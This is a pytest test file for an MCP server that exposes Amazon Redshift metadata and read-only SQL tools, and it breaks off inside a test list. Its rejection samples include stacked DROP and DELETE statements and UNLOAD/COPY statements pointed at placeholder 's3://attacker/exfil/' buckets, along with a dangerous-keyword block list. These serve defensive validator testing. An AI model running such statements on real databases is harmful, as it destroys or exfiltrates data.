import pytest
import pandas as pd
from unittest.mock import MagicMock, patch, Mock
from contextlib import contextmanager
from redshift_comment_mcp.redshift_tools import (
    RedshiftTools,
    ConnectionDecision,
    paginate_results,
    apply_comment_cap,
    build_scale_hint,
    DEFAULT_MAX_ITEMS,
    MAX_COMMENT_LEN,
    SCALE_HINT_THRESHOLD,
    validate_read_only_sql,
)
from redshift_comment_mcp.connection import RedshiftConnectionConfig

def _get_tool_fn(tools, name):
    """Pull a registered tool's callable, surviving FastMCP API churn.

    FastMCP renamed / re-scoped the tool listing API across 2.x → 3.x:
    - 2.x exposes only the private coroutine ``_list_tools``
    - 3.x exposes a public coroutine ``list_tools``
    Try the public name first, fall back to the private one. ``tool.fn`` is
    stable across both lines.
    """
    import asyncio
    lister = getattr(tools.mcp, 'list_tools', None) or tools.mcp._list_tools
    for t in asyncio.run(lister()):
        if t.name == name:
            return t.fn
    raise KeyError(f"tool {name!r} not registered")


@pytest.fixture
def mock_config():
    """建立模擬的連線配置"""
    config = Mock(spec=RedshiftConnectionConfig)
    mock_conn = MagicMock()
    
    @contextmanager
    def mock_get_connection():
        try:
            yield mock_conn
        finally:
            pass
    
    config.get_connection = mock_get_connection
    return config, mock_conn

def test_connection_management(mock_config):
    """
    測試每次使用時建立/切斷連線的功能。
    """
    config, mock_conn = mock_config
    
    # 建立工具實例
    redshift_tools = RedshiftTools(lambda: config)
    
    # 驗證 FastMCP 實例被建立
    assert redshift_tools.mcp is not None
    assert hasattr(redshift_tools, 'config')

@patch('awswrangler.redshift.read_sql_query')
def test_list_schemas_with_connection(mock_read_sql, mock_config):
    """
    測試 list_schemas 工具的連線管理。
    """
    config, mock_conn = mock_config
    
    # 設定模擬資料
    mock_df = MagicMock()
    mock_df.fillna.return_value = mock_df
    mock_df.to_dict.return_value = [{'schema_name': 'public', 'schema_comment': ''}]
    mock_read_sql.return_value = mock_df
    
    # 建立工具實例 - 這會觸發工具註冊
    redshift_tools = RedshiftTools(lambda: config)
    
    # 驗證伺服器建立成功
    mcp_server = redshift_tools.get_server()
    assert mcp_server is not None
    assert mcp_server.name == "Redshift Comment MCP"
    
    # 驗證 awswrangler 被呼叫 (透過 connection context manager)
    # 由於工具已註冊但尚未執行，這裡主要驗證初始化無誤
    assert mock_read_sql.call_count == 0  # 尚未執行查詢

def test_schema_name_validation():
    """
    測試 schema 名稱驗證邏輯。
    """
    # 測試有效的 schema 名稱
    valid_names = ['public', 'schema1', 'my_schema']
    for name in valid_names:
        assert name and name.isidentifier(), f"{name} should be valid"
    
    # 測試無效的 schema 名稱
    invalid_names = ['', 'schema-with-dash', '123schema', 'schema with space']
    for name in invalid_names:
        assert not (name and name.isidentifier()), f"{name} should be invalid"

def test_sql_security_validation():
    """
    測試 SQL 安全性驗證邏輯。
    """
    # 測試有效的查詢
    valid_queries = [
        "SELECT * FROM users",
        "  SELECT count(*) FROM orders  ",  # 測試空白字元
        "WITH cte AS (SELECT * FROM users) SELECT * FROM cte"
    ]
    
    for query in valid_queries:
        sql_upper = query.strip().upper()
        assert sql_upper.startswith('SELECT') or sql_upper.startswith('WITH'), f"{query} should be valid"
    
    # 測試危險的 SQL 關鍵字
    dangerous_keywords = [
        'DROP', 'DELETE', 'UPDATE', 'INSERT', 'ALTER', 'CREATE', 'TRUNCATE',
        'MERGE', 'GRANT', 'REVOKE', 'COPY', 'UNLOAD',
    ]
    dangerous_queries = [
        "DROP TABLE users",
        "DELETE FROM users",
        "UPDATE users SET password = 'hack'",
        "INSERT INTO users VALUES ('hacker', 'password')",
        "ALTER TABLE users ADD COLUMN malicious TEXT",
        "CREATE TABLE evil_table (id INT)",
        "TRUNCATE TABLE users",
        "MERGE INTO users USING staging ON users.id = staging.id WHEN MATCHED THEN UPDATE SET name = staging.name",
        "GRANT ALL ON users TO public",
        "REVOKE SELECT ON users FROM analyst",
        "COPY users FROM 's3://attacker/users.csv' IAM_ROLE 'arn:...'",
        "UNLOAD ('SELECT * FROM users') TO 's3://attacker/exfil/' IAM_ROLE 'arn:...'",
    ]
    
    for query in dangerous_queries:
        sql_upper = query.strip().upper()
        has_dangerous_keyword = any(keyword in sql_upper for keyword in dangerous_keywords)
        assert has_dangerous_keyword, f"{query} should contain dangerous keyword"
    
    # 測試非 SELECT/WITH 開頭的語句
    invalid_queries = ["SHOW TABLES", "DESCRIBE users", "EXPLAIN SELECT * FROM users"]
    for query in invalid_queries:
        sql_upper = query.strip().upper()
        assert not (sql_upper.startswith('SELECT') or sql_upper.startswith('WITH')), f"{query} should be invalid"

def test_redshift_tools_initialization():
    """
    測試 RedshiftTools 的完整初始化流程。
    """
    # 建立模擬配置
    config = MagicMock()
    
    # 建立工具實例
    redshift_tools = RedshiftTools(lambda: config)
    
    # 驗證屬性設定
    assert redshift_tools.config == config
    assert redshift_tools.mcp is not None
    
    # 驗證伺服器建立
    server = redshift_tools.get_server()
    assert server is not None
    assert server.name == "Redshift Comment MCP"


# ========== paginate_results 函數測試 ==========

class TestPaginateResults:
    """測試 paginate_results 分頁函數"""

    def test_no_limit_within_default_max(self):
        """測試無 limit 且資料量在預設範圍內"""
        items = list(range(30))
        result = paginate_results(items, limit=None, offset=0, default_max=50)

        assert result["total_count"] == 30
        assert result["returned_count"] == 30
        assert result["has_more"] == False
        assert result["auto_truncated"] == False
        assert len(result["items"]) == 30

    def test_no_limit_exceeds_default_max(self):
        """測試無 limit 且資料量超過預設最大值時自動截斷"""
        items = list(range(100))
        result = paginate_results(items, limit=None, offset=0, default_max=50)

        assert result["total_count"] == 100
        assert result["returned_count"] == 50
        assert result["has_more"] == True
        assert result["auto_truncated"] == True
        assert len(result["items"]) == 50

    def test_with_explicit_limit(self):
        """測試有明確 limit 時的分頁"""
        items = list(range(100))
        result = paginate_results(items, limit=20, offset=0, default_max=50)

        assert result["total_count"] == 100
        assert result["returned_count"] == 20
        assert result["has_more"] == True
        assert result["auto_truncated"] == False
        assert result["limit"] == 20

    def test_with_offset(self):
        """測試 offset 參數"""
        items = list(range(100))
        result = paginate_results(items, limit=10, offset=50, default_max=50)

        assert result["total_count"] == 100
        assert result["offset"] == 50
        assert result["items"] == list(range(50, 60))

    def test_empty_list(self):
        """測試空列表"""
        items = []
        result = paginate_results(items, limit=None, offset=0, default_max=50)

        assert result["total_count"] == 0
        assert result["returned_count"] == 0
        assert result["has_more"] == False
        assert result["items"] == []

    def test_exact_boundary(self):
        """測試剛好等於預設最大值的情況"""
        items = list(range(50))
        result = paginate_results(items, limit=None, offset=0, default_max=50)

        assert result["total_count"] == 50
        assert result["returned_count"] == 50
        assert result["has_more"] == False
        assert result["auto_truncated"] == False


# ========== 列表工具執行測試 ==========

class TestListToolsExecution:
    """測試列表工具的實際執行"""

    @patch('awswrangler.redshift.read_sql_query')
    def test_list_schemas_execution(self, mock_read_sql, mock_config):
        """測試 list_schemas 工具執行（不含註解）"""
        config, mock_conn = mock_config

        # 模擬回傳資料
        mock_df = pd.DataFrame({'schema_name': ['public', 'sales', 'analytics']})
        mock_read_sql.return_value = mock_df

        tools = RedshiftTools(lambda: config)
        # 取得註冊的工具函數
        list_schemas = _get_tool_fn(tools, 'list_schemas')

        result = list_schemas(include_comments=False)

        assert result["total_count"] == 3
        assert result["schemas"] == ['public', 'sales', 'analytics']
        assert "warning" in result

    @patch('awswrangler.redshift.read_sql_query')
    def test_list_schemas_with_include_comments(self, mock_read_sql, mock_config):
        """測試 list_schemas 工具啟用 include_comments"""
        config, mock_conn = mock_config

        # 模擬回傳資料（包含註解）
        mock_df = pd.DataFrame({
            'schema_name': ['public', 'sales'],
            'schema_comment': ['Default schema', 'Sales data schema']
        })
        mock_read_sql.return_value = mock_df

        tools = RedshiftTools(lambda: config)
        list_schemas = _get_tool_fn(tools, 'list_schemas')

        result = list_schemas(include_comments=True)

        assert result["total_count"] == 2
        # 使用 include_comments=True 時，回傳格式為 [{"name": "...", "comment": "..."}, ...]
        assert len(result["schemas"]) == 2
        assert result["schemas"][0] == {"name": "public", "comment": "Default schema"}
        assert result["schemas"][1] == {"name": "sales", "comment": "Sales data schema"}

    @patch('awswrangler.redshift.read_sql_query')
    def test_list_schemas_with_include_comments_no_comment(self, mock_read_sql, mock_config):
        """測試 list_schemas 工具啟用 include_comments 但 schema 無註解"""
        config, mock_conn = mock_config

        # 模擬回傳資料（無註解）
        mock_df = pd.DataFrame({
            'schema_name': ['public'],
            'schema_comment': [None]
        })
        mock_read_sql.return_value = mock_df

        tools = RedshiftTools(lambda: config)
        list_schemas = _get_tool_fn(tools, 'list_schemas')

        result = list_schemas(include_comments=True)

        assert result["total_count"] == 1
        assert result["schemas"][0] == {"name": "public", "comment": "(No comment available)"}

    @patch('awswrangler.redshift.read_sql_query')
    def test_list_tables_execution(self, mock_read_sql, mock_config):
        """測試 list_tables 工具執行（不含註解）"""
        config, mock_conn = mock_config

        # 模擬 schema comment 查詢和 tables 查詢
        schema_df = pd.DataFrame({'schema_comment': ['Sales data schema']})
        tables_df = pd.DataFrame({
            'table_name': ['orders', 'customers'],
            'table_type': ['BASE TABLE', 'BASE TABLE']
        })
        mock_read_sql.side_effect = [schema_df, tables_df]

        tools = RedshiftTools(lambda: config)
        list_tables = _get_tool_fn(tools, 'list_tables')

        result = list_tables(schema_name='sales', include_comments=False)

        assert result["schema_name"] == 'sales'
        assert result["schema_comment"] == 'Sales data schema'
        assert result["total_count"] == 2
        assert len(result["tables"]) == 2

    @patch('awswrangler.redshift.read_sql_query')
    def test_list_tables_with_include_comments(self, mock_read_sql, mock_config):
        """測試 list_tables 工具啟用 include_comments"""
        config, mock_conn = mock_config

        # 模擬 schema comment 查詢和 tables 查詢（包含 table 註解）
        schema_df = pd.DataFrame({'schema_comment': ['Sales data schema']})
        tables_df = pd.DataFrame({
            'table_name': ['orders', 'customers'],
            'table_type': ['BASE TABLE', 'BASE TABLE'],
            'table_comment': ['Order records', 'Customer master data']
        })
        mock_read_sql.side_effect = [schema_df, tables_df]

        tools = RedshiftTools(lambda: config)
        list_tables = _get_tool_fn(tools, 'list_tables')

        result = list_tables(schema_name='sales', include_comments=True)

        assert result["schema_name"] == 'sales'
        assert result["total_count"] == 2
        # 使用 include_comments=True 時，回傳格式包含 comment 欄位
        assert result["tables"][0] == {"name": "orders", "type": "BASE TABLE", "comment": "Order records"}
        assert result["tables"][1] == {"name": "customers", "type": "BASE TABLE", "comment": "Customer master data"}

    @patch('awswrangler.redshift.read_sql_query')
    def test_list_tables_with_include_comments_no_comment(self, mock_read_sql, mock_config):
        """測試 list_tables 工具啟用 include_comments 但 table 無註解"""
        config, mock_conn = mock_config

        schema_df = pd.DataFrame({'schema_comment': ['Sales data schema']})
        tables_df = pd.DataFrame({
            'table_name': ['orders'],
            'table_type': ['BASE TABLE'],
            'table_comment': [None]
        })
        mock_read_sql.side_effect = [schema_df, tables_df]

        tools = RedshiftTools(lambda: config)
        list_tables = _get_tool_fn(tools, 'list_tables')

        result = list_tables(schema_name='sales', include_comments=True)

        assert result["tables"][0] == {"name": "orders", "type": "BASE TABLE", "comment": "(No comment available)"}

    @patch('awswrangler.redshift.read_sql_query')
    def test_list_tables_without_parent_comments(self, mock_read_sql, mock_config):
        """測試 list_tables 工具停用 include_parent_comments"""
        config, mock_conn = mock_config

        # 只模擬 tables 查詢（不查詢 schema comment）
        tables_df = pd.DataFrame({
            'table_name': ['orders', 'customers'],
            'table_type': ['BASE TABLE', 'BASE TABLE']
        })
        mock_read_sql.return_value = tables_df

        tools = RedshiftTools(lambda: config)
        list_tables = _get_tool_fn(tools, 'list_tables')

        result = list_tables(schema_name='sales', include_parent_comments=False)

        assert result["schema_name"] == 'sales'
        assert "schema_comment" not in result  # 不應包含 schema_comment
        assert result["total_count"] == 2
        # 只有一次 SQL 查詢（不包含 schema comment 查詢）
        assert mock_read_sql.call_count == 1

    @patch('awswrangler.redshift.read_sql_query')
    def test_list_columns_execution(self, mock_read_sql, mock_config):
        """測試 list_columns 工具執行（不含註解）"""
        config, mock_conn = mock_config

        # 模擬 table comment 查詢和 columns 查詢
        table_df = pd.DataFrame({'table_comment': ['Order records']})
        columns_df = pd.DataFrame({
            'column_name': ['id', 'customer_id', 'amount'],
            'data_type': ['integer', 'integer', 'numeric'],
            'is_nullable': ['NO', 'NO', 'YES']
        })
        mock_read_sql.side_effect = [table_df, columns_df]

        tools = RedshiftTools(lambda: config)
        list_columns = _get_tool_fn(tools, 'list_columns')

        result = list_columns(schema_name='sales', table_name='orders', include_comments=False)

        assert result["schema_name"] == 'sales'
        assert result["table_name"] == 'orders'
        assert result["table_comment"] == 'Order records'
        assert result["total_count"] == 3

    @patch('awswrangler.redshift.read_sql_query')
    def test_list_columns_with_include_comments(self, mock_read_sql, mock_config):
        """測試 list_columns 工具啟用 include_comments"""
        config, mock_conn = mock_config

        # 模擬 table comment 查詢和 columns 查詢（包含 column 註解）
        table_df = pd.DataFrame({'table_comment': ['Order records']})
        columns_df = pd.DataFrame({
            'column_name': ['id', 'amount'],
            'data_type': ['integer', 'numeric'],
            'is_nullable': ['NO', 'YES'],
            'column_comment': ['Primary key', 'Order total amount']
        })
        mock_read_sql.side_effect = [table_df, columns_df]

        tools = RedshiftTools(lambda: config)
        list_columns = _get_tool_fn(tools, 'list_columns')

        result = list_columns(schema_name='sales', table_name='orders', include_comments=True)

        assert result["schema_name"] == 'sales'
        assert result["table_name"] == 'orders'
        assert result["total_count"] == 2
        # 使用 include_comments=True 時，回傳格式包含 comment 欄位
        assert result["columns"][0] == {"name": "id", "type": "integer", "nullable": "NO", "comment": "Primary key"}
        assert result["columns"][1] == {"name": "amount", "type": "numeric", "nullable": "YES", "comment": "Order total amount"}

    @patch('awswrangler.redshift.read_sql_query')
    def test_list_columns_with_include_comments_no_comment(self, mock_read_sql, mock_config):
        """測試 list_columns 工具啟用 include_comments 但 column 無註解"""
        config, mock_conn = mock_config

        table_df = pd.DataFrame({'table_comment': ['Order records']})
        columns_df = pd.DataFrame({
            'column_name': ['id'],
            'data_type': ['integer'],
            'is_nullable': ['NO'],
            'column_comment': [None]
        })
        mock_read_sql.side_effect = [table_df, columns_df]

        tools = RedshiftTools(lambda: config)
        list_columns = _get_tool_fn(tools, 'list_columns')

        result = list_columns(schema_name='sales', table_name='orders', include_comments=True)

        assert result["columns"][0] == {"name": "id", "type": "integer", "nullable": "NO", "comment": "(No comment available)"}

    @patch('awswrangler.redshift.read_sql_query')
    def test_list_columns_without_parent_comments(self, mock_read_sql, mock_config):
        """測試 list_columns 工具停用 include_parent_comments"""
        config, mock_conn = mock_config

        # 只模擬 columns 查詢（不查詢 table comment）
        columns_df = pd.DataFrame({
            'column_name': ['id', 'amount'],
            'data_type': ['integer', 'numeric'],
            'is_nullable': ['NO', 'YES']
        })
        mock_read_sql.return_value = columns_df

        tools = RedshiftTools(lambda: config)
        list_columns = _get_tool_fn(tools, 'list_columns')

        result = list_columns(schema_name='sales', table_name='orders', include_parent_comments=False)

        assert result["schema_name"] == 'sales'
        assert result["table_name"] == 'orders'
        assert "table_comment" not in result  # 不應包含 table_comment
        assert result["total_count"] == 2
        # 只有一次 SQL 查詢（不包含 table comment 查詢）
        assert mock_read_sql.call_count == 1


# ========== 搜尋工具測試 ==========

class TestSearchTools:
    """測試搜尋工具"""

    @patch('awswrangler.redshift.read_sql_query')
    def test_search_schemas_execution(self, mock_read_sql, mock_config):
        """測試 search_schemas 工具執行"""
        config, mock_conn = mock_config

        mock_df = pd.DataFrame({
            'schema_name': ['sales', 'sales_archive'],
            'schema_comment': ['Sales data schema', 'Archived sales data']
        })
        mock_read_sql.return_value = mock_df

        tools = RedshiftTools(lambda: config)
        search_schemas = _get_tool_fn(tools, 'search_schemas')

        result = search_schemas(keywords='sales 銷售')

        assert result["keywords"] == ['sales', '銷售']
        assert result["total_count"] == 2
        assert len(result["schemas"]) == 2
        # 第一個結果應有最高 hit_count（或相同 hit_count 時按名稱排序）
        assert "hit_count" in result["schemas"][0]
        assert result["schemas"][0]["name"] == "sales"
        assert result["schemas"][0]["comment"] == "Sales data schema"

    def test_search_schemas_empty_keywords(self, mock_config):
        """測試 search_schemas 空關鍵字驗證"""
        config, mock_conn = mock_config
        tools = RedshiftTools(lambda: config)

        search_schemas = _get_tool_fn(tools, 'search_schemas')

        with pytest.raises(ValueError, match="At least one keyword is required"):
            search_schemas(keywords='   ')

    @patch('awswrangler.redshift.read_sql_query')
    def test_search_schemas_no_comment(self, mock_read_sql, mock_config):
        """測試 search_schemas 無註解時回傳預設訊息"""
        config, mock_conn = mock_config

        mock_df = pd.DataFrame({
            'schema_name': ['public'],
            'schema_comment': ['']
        })
        mock_read_sql.return_value = mock_df

        tools = RedshiftTools(lambda: config)
        search_schemas = _get_tool_fn(tools, 'search_schemas')

        result = search_schemas(keywords='public')

        assert result["schemas"][0]["name"] == "public"
        assert result["schemas"][0]["comment"] == "(No comment available)"
        assert "hit_count" in result["schemas"][0]

    @patch('awswrangler.redshift.read_sql_query')
    def test_search_schemas_hit_count_sorting(self, mock_read_sql, mock_config):
        """測試 search_schemas 結果依 hit_count 降序排列"""
        config, mock_conn = mock_config

        # 設定測試資料：sales_data 應該命中 2 個關鍵字，其他只命中 1 個
        mock_df = pd.DataFrame({
            'schema_name': ['analytics', 'sales_data', 'archive'],
            'schema_comment': ['Analytics reports', 'Sales and data warehouse', 'Old data']
        })
        mock_read_sql.return_value = mock_df

        tools = RedshiftTools(lambda: config)
        search_schemas = _get_tool_fn(tools, 'search_schemas')

        # 搜尋 "sales data" - sales_data 應該命中兩個關鍵字
        result = search_schemas(keywords='sales data')

        # 驗證 hit_count 排序
        assert result["schemas"][0]["name"] == "sales_data"
        assert result["schemas"][0]["hit_count"] == 2  # 命中 'sales' 和 'data'
        # 其他結果 hit_count 應該較低
        for schema in result["schemas"][1:]:
            assert schema["hit_count"] <= result["schemas"][0]["hit_count"]

    @patch('awswrangler.redshift.read_sql_query')
    def test_search_tables_hit_count_sorting(self, mock_read_sql, mock_config):
        """測試 search_tables 結果依 hit_count 降序排列"""
        config, mock_conn = mock_config

        mock_df = pd.DataFrame({
            'schema_name': ['sales', 'sales', 'sales'],
            'table_name': ['order_items', 'orders', 'customers'],
            'table_type': ['BASE TABLE', 'BASE TABLE', 'BASE TABLE'],
            'table_comment': ['Order line items with order details', 'Order records', 'Customer info']
        })
        mock_read_sql.return_value = mock_df

        tools = RedshiftTools(lambda: config)
        search_tables = _get_tool_fn(tools, 'search_tables')

        # 搜尋 "order items" - order_items 應該命中兩個關鍵字
        result = search_tables(keywords='order items', schema_name='sales')

        # 驗證 hit_count 排序
        assert result["tables"][0]["table_name"] == "order_items"
        assert result["tables"][0]["hit_count"] == 2  # 命中 'order' 和 'items'
        assert "hit_count" in result["tables"][1]

    @patch('awswrangler.redshift.read_sql_query')
    def test_search_columns_hit_count_sorting(self, mock_read_sql, mock_config):
        """測試 search_columns 結果依 hit_count 降序排列"""
        config, mock_conn = mock_config

        mock_df = pd.DataFrame({
            'table_name': ['orders', 'orders', 'orders'],
            'column_name': ['total_amount', 'order_id', 'amount'],
            'data_type': ['numeric', 'integer', 'numeric'],
            'is_nullable': ['YES', 'NO', 'YES'],
            'column_comment': ['Total order amount', 'Order identifier', 'Transaction amount']
        })
        mock_read_sql.return_value = mock_df

        tools = RedshiftTools(lambda: config)
        search_columns = _get_tool_fn(tools, 'search_columns')

        # 搜尋 "total amount" - total_amount 應該命中兩個關鍵字
        result = search_columns(keywords='total amount', schema_name='sales', table_name='orders')

        # 驗證 hit_count 排序
        assert result["columns"][0]["column_name"] == "total_amount"
        assert result["columns"][0]["hit_count"] == 2  # 命中 'total' 和 'amount'
        assert "hit_count" in result["columns"][1]

    @patch('awswrangler.redshift.read_sql_query')
    def test_search_tables_execution(self, mock_read_sql, mock_config):
        """測試 search_tables 工具執行"""
        config, mock_conn = mock_config

        mock_df = pd.DataFrame({
            'schema_name': ['sales', 'sales'],
            'table_name': ['orders', 'order_items'],
            'table_type': ['BASE TABLE', 'BASE TABLE'],
            'table_comment': ['Order records', 'Order line items']
        })
        mock_read_sql.return_value = mock_df

        tools = RedshiftTools(lambda: config)
        search_tables = _get_tool_fn(tools, 'search_tables')

        result = search_tables(keywords='order 訂單', schema_name='sales')

        assert result["keywords"] == ['order', '訂單']
        assert result["schema_filter"] == 'sales'  # 注意：回傳欄位名稱是 schema_filter
        assert result["total_count"] == 2

    def test_search_tables_empty_keywords(self, mock_config):
        """測試 search_tables 空關鍵字驗證"""
        config, mock_conn = mock_config
        tools = RedshiftTools(lambda: config)

        search_tables = _get_tool_fn(tools, 'search_tables')

        with pytest.raises(ValueError, match="At least one keyword is required"):
            search_tables(keywords='   ', schema_name='sales')

    def test_search_tables_invalid_schema(self, mock_config):
        """測試 search_tables 無效 schema 名稱"""
        config, mock_conn = mock_config
        tools = RedshiftTools(lambda: config)

        search_tables = _get_tool_fn(tools, 'search_tables')

        with pytest.raises(ValueError, match="Invalid schema name"):
            search_tables(keywords='order', schema_name='invalid-schema')

    @patch('awswrangler.redshift.read_sql_query')
    def test_search_columns_execution(self, mock_read_sql, mock_config):
        """測試 search_columns 工具執行"""
        config, mock_conn = mock_config

        mock_df = pd.DataFrame({
            'table_name': ['orders', 'orders'],
            'column_name': ['customer_id', 'customer_name'],
            'data_type': ['integer', 'varchar'],
            'is_nullable': ['NO', 'YES'],
            'column_comment': ['Customer ID', 'Customer full name']
        })
        mock_read_sql.return_value = mock_df

        tools = RedshiftTools(lambda: config)
        search_columns = _get_tool_fn(tools, 'search_columns')

        result = search_columns(keywords='customer', schema_name='sales', table_name='orders')

        assert result["keywords"] == ['customer']
        assert result["schema_name"] == 'sales'
        assert result["table_name"] == 'orders'
        assert result["total_count"] == 2

    def test_search_columns_invalid_table(self, mock_config):
        """測試 search_columns 無效 table 名稱"""
        config, mock_conn = mock_config
        tools = RedshiftTools(lambda: config)

        search_columns = _get_tool_fn(tools, 'search_columns')

        with pytest.raises(ValueError, match="Invalid table name"):
            search_columns(keywords='id', schema_name='sales', table_name='invalid-table')


# ========== 註解查詢工具測試 ==========

class TestCommentQueryTools:
    """測試註解查詢工具"""

    @patch('awswrangler.redshift.read_sql_query')
    def test_get_schema_comment_execution(self, mock_read_sql, mock_config):
        """測試 get_schema_comment 工具執行"""
        config, mock_conn = mock_config

        mock_df = pd.DataFrame({'schema_comment': ['This is the sales schema']})
        mock_read_sql.return_value = mock_df

        tools = RedshiftTools(lambda: config)
        get_schema_comment = _get_tool_fn(tools, 'get_schema_comment')

        result = get_schema_comment(schema_name='sales')

        assert result["schema_name"] == 'sales'
        assert result["comment"] == 'This is the sales schema'

    @patch('awswrangler.redshift.read_sql_query')
    def test_get_schema_comment_not_found(self, mock_read_sql, mock_config):
        """測試 get_schema_comment schema 不存在"""
        config, mock_conn = mock_config

        mock_df = pd.DataFrame(columns=['schema_comment'])  # 空的 DataFrame
        mock_read_sql.return_value = mock_df

        tools = RedshiftTools(lambda: config)
        get_schema_comment = _get_tool_fn(tools, 'get_schema_comment')

        with pytest.raises(ValueError, match="not found"):
            get_schema_comment(schema_name='nonexistent')

    @patch('awswrangler.redshift.read_sql_query')
    def test_get_table_comment_execution(self, mock_read_sql, mock_config):
        """測試 get_table_comment 工具執行"""
        config, mock_conn = mock_config

        mock_df = pd.DataFrame({'table_comment': ['Contains order records']})
        mock_read_sql.return_value = mock_df

        tools = RedshiftTools(lambda: config)
        get_table_comment = _get_tool_fn(tools, 'get_table_comment')

        result = get_table_comment(schema_name='sales', table_name='orders')

        assert result["schema_name"] == 'sales'
        assert result["table_name"] == 'orders'
        assert result["comment"] == 'Contains order records'

    @patch('awswrangler.redshift.read_sql_query')
    def test_get_column_comment_execution(self, mock_read_sql, mock_config):
        """測試 get_column_comment 工具執行"""
        config, mock_conn = mock_config

        mock_df = pd.DataFrame({
            'data_type': ['integer'],
            'column_comment': ['Primary key for orders']
        })
        mock_read_sql.return_value = mock_df

        tools = RedshiftTools(lambda: config)
        get_column_comment = _get_tool_fn(tools, 'get_column_comment')

        result = get_column_comment(schema_name='sales', table_name='orders', column_name='id')

        assert result["schema_name"] == 'sales'
        assert result["table_name"] == 'orders'
        assert result["column_name"] == 'id'
        assert result["data_type"] == 'integer'
        assert result["comment"] == 'Primary key for orders'

    @patch('awswrangler.redshift.read_sql_query')
    def test_get_all_column_comments_execution(self, mock_read_sql, mock_config):
        """測試 get_all_column_comments 工具執行"""
        config, mock_conn = mock_config

        mock_df = pd.DataFrame({
            'column_name': ['id', 'amount'],
            'data_type': ['integer', 'numeric'],
            'is_nullable': ['NO', 'YES'],
            'column_comment': ['Order ID', None]
        })
        mock_read_sql.return_value = mock_df

        tools = RedshiftTools(lambda: config)
        get_all_column_comments = _get_tool_fn(tools, 'get_all_column_comments')

        result = get_all_column_comments(schema_name='sales', table_name='orders')

        assert result["schema_name"] == 'sales'
        assert result["table_name"] == 'orders'
        assert result["total_count"] == 2


# ========== SQL 執行測試 ==========

class TestExecuteSQL:
    """測試 SQL 執行工具"""

    @patch('awswrangler.redshift.read_sql_query')
    def test_execute_sql_select(self, mock_read_sql, mock_config):
        """測試有效的 SELECT 查詢"""
        config, mock_conn = mock_config

        mock_df = pd.DataFrame({
            'id': [1, 2, 3],
            'name': ['Alice', 'Bob', 'Charlie']
        })
        mock_read_sql.return_value = mock_df

        tools = RedshiftTools(lambda: config)
        execute_sql = _get_tool_fn(tools, 'execute_sql')

        result = execute_sql(sql_statement='SELECT * FROM users')

        assert result["total_count"] == 3
        assert result["columns"] == ['id', 'name']
        assert len(result["data"]) == 3

    @patch('awswrangler.redshift.read_sql_query')
    def test_execute_sql_with_cte(self, mock_read_sql, mock_config):
        """測試有效的 WITH (CTE) 查詢"""
        config, mock_conn = mock_config

        mock_df = pd.DataFrame({'count': [10]})
        mock_read_sql.return_value = mock_df

        tools = RedshiftTools(lambda: config)
        execute_sql = _get_tool_fn(tools, 'execute_sql')

        result = execute_sql(sql_statement='WITH cte AS (SELECT * FROM users) SELECT count(*) FROM cte')

        assert result["total_count"] == 1

    def test_execute_sql_dangerous_drop(self, mock_config):
        """測試拒絕 DROP 語句"""
        config, mock_conn = mock_config
        tools = RedshiftTools(lambda: config)

        execute_sql = _get_tool_fn(tools, 'execute_sql')

        with pytest.raises(ValueError, match="DROP"):
            execute_sql(sql_statement='SELECT * FROM users; DROP TABLE users')

    def test_execute_sql_dangerous_delete(self, mock_config):
        """測試拒絕包含 DELETE 的查詢"""
        config, mock_conn = mock_config
        tools = RedshiftTools(lambda: config)

        execute_sql = _get_tool_fn(tools, 'execute_sql')

        # 使用 SELECT 開頭但包含 DELETE 的語句
        with pytest.raises(ValueError, match="DELETE"):
            execute_sql(sql_statement='SELECT * FROM users; DELETE FROM users WHERE id = 1')

    def test_execute_sql_invalid_start(self, mock_config):
        """測試拒絕非 SELECT/WITH 開頭的查詢"""
        config, mock_conn = mock_config
        tools = RedshiftTools(lambda: config)

        execute_sql = _get_tool_fn(tools, 'execute_sql')

        with pytest.raises(ValueError, match="Only SELECT and WITH"):
            execute_sql(sql_statement='SHOW TABLES')

    @pytest.mark.parametrize("keyword,sql", [
        # MERGE SQL kept minimal so it doesn't contain UPDATE/DELETE/INSERT (which would
        # match earlier in the dangerous_keywords list and mask the MERGE check).
        ("MERGE",  "WITH src AS (SELECT 1 id) SELECT 1; MERGE INTO t USING src ON 1=1"),
        ("GRANT",  "SELECT 1; GRANT ALL ON users TO public"),
        ("REVOKE", "SELECT 1; REVOKE SELECT ON users FROM analyst"),
        ("COPY",   "SELECT 1; COPY users FROM 's3://bad/' IAM_ROLE 'arn:...'"),
        ("UNLOAD", "SELECT 1; UNLOAD ('SELECT * FROM users') TO 's3://exfil/' IAM_ROLE 'arn:...'"),
    ])
    def test_execute_sql_dangerous_extra_keywords(self, mock_config, keyword, sql):
        """擋掉 v0.3.x 後新增的關鍵字（MERGE / GRANT / REVOKE / COPY / UNLOAD），
        含 CTE 偽裝（SELECT 開頭但 DML/admin 動作藏在後段）。"""
        config, _ = mock_config
        tools = RedshiftTools(lambda: config)
        execute_sql = _get_tool_fn(tools, 'execute_sql')
        with pytest.raises(ValueError, match=keyword):
            execute_sql(sql_statement=sql)

    @patch('awswrangler.redshift.read_sql_query')
    def test_execute_sql_with_bom_prefix_passes(self, mock_read_sql, mock_config):
        """BOM 等不可見字元在 SQL 前不應誤觸 startswith 檢查。"""
        config, _ = mock_config
        mock_read_sql.return_value = pd.DataFrame({'x': [1]})
        tools = RedshiftTools(lambda: config)
        execute_sql = _get_tool_fn(tools, 'execute_sql')
        # 各種會出現在傳輸層或編輯器複製的不可見前綴
        for prefix in ('﻿', '​', ' ', '⁠'):
            result = execute_sql(sql_statement=prefix + 'WITH cte AS (SELECT 1 x) SELECT * FROM cte')
            assert result["total_count"] == 1


class TestValidateReadOnlySQL:
    """直接測試 validate_read_only_sql 純函式（不繞 MCP/連線）。"""

    @pytest.mark.parametrize("sql", [
        "SELECT 1",
        "  select 1  ",
        "WITH cte AS (SELECT 1 x) SELECT * FROM cte",
        "with cte as (select 1) select * from cte",
        "﻿SELECT 1",
        "​ WITH cte AS (SELECT 1 x) SELECT * FROM cte",
        # 字串/註解內含禁字 — 不應誤殺
        "SELECT * FROM users WHERE name = 'DELETE me'",
        "SELECT col1 -- DROP TABLE old, kept for archaeology\nFROM t",
        "SELECT col1 /* could DROP this column later */ FROM t",
        "SELECT 'INSERT INTO logs VALUES (1)' AS note FROM dual",
        # quoted identifier 用禁字當欄名
        'SELECT "DELETE" FROM "DROP"',
        # 使用者實際失敗的那支結構
        "WITH dev AS (SELECT 1 a), prod AS (SELECT 1 a), j AS "
        "(SELECT dev.a FROM dev JOIN prod ON dev.a = prod.a) "
